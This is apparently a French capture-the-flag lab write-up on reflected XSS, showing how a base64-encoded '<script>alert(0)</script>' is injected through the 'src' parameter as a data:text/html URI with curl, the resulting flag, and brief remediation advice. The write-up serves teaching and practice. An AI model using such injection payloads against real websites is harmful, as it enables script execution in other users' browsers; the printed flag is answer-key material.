# XSS reflected injection

## Exploitation 

Lorsque l'on clique sur l'image de la NSA on se retrouve a avoir dans l'url les elements "?page=media&src=nsa".
La page se sert alors de src=nsa pour afficher l'image demandee.
De notre cote on peut s'en servir pour injecter de la data.

```bash
$> echo "<script>alert(0)</script>" | base64
PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pgo=

$> curl "http://192.168.122.41/?page=media&src=%22data:text/html;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pgo=" | grep flag

The flag is : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
```

## Resolution

Pour eviter ce type de failles on prefereras rejeter les requetes qui contiennent des caracteres speciaux.
Aussi on prefereras proceder d'une maniere differente pour seulement afficher des images statiques comme celles la.
